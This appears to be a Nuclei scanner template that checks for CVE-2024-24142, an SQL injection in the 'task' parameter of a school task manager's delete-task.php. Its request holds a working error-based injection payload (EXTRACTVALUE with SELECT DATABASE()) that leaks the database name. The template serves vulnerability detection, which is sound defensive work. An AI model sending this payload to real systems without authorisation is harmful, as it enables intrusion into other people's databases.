id: sql-injection-detection
info:
  author: hellonotworld99, yjeongc, HohoHoui, shinyeji-spea
  description: This template checks for SQL injection vulnerability in the 'task'
    parameter of the delete-task.php endpoint by looking for a specific database name
    in error messages.
  name: SQL Injection Detection
  reference:
  - https://sqlmap.org/
  - https://github.com/BurakSevben/CVE-2024-24142?tab=readme-ov-file
  severity: high
  tags: sql,injection
requests:
- matchers:
  - condition: and
    name: database-name-error
    part: body
    regex:
    - school_task_manager_db
    type: regex
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/school-task-manager/endpoint/delete-task.php?task=5'' AND EXTRACTVALUE(1,
    CONCAT(0x5c, (SELECT DATABASE()), 0x5c))--'''
